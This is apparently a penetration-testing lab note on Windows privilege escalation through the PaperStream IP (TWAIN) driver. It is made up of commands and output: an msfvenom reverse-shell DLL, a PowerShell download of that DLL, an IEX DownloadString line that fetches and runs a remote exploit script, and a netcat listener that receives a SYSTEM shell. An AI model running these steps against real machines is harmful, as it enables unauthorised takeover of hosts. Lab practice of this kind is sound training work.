# 6 privesc\_1 PaperStream IP (TWAIN)

```
Using https://www.exploit-db.com/exploits/49382

msfvenom -p windows/shell_reverse_tcp -f dll -o k.dll LHOST=192.168.49.105 LPORT=445
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 8704 bytes
Saved as: k.dll

C:\Users\tony\Documents> powershell.exe -c wget 192.168.49.105/k.dll -Outfile k.dll
# saved on target

# call it
powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.105/49382.ps1')
Writable location found, copying payload to C:\JavaTemp\
Payload copied, triggering...

$ sudo nc -lvnp 445
[sudo] password for kashz:
listening on [any] 445 ...
connect to [192.168.49.105] from (UNKNOWN) [192.168.105.66] 49889
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
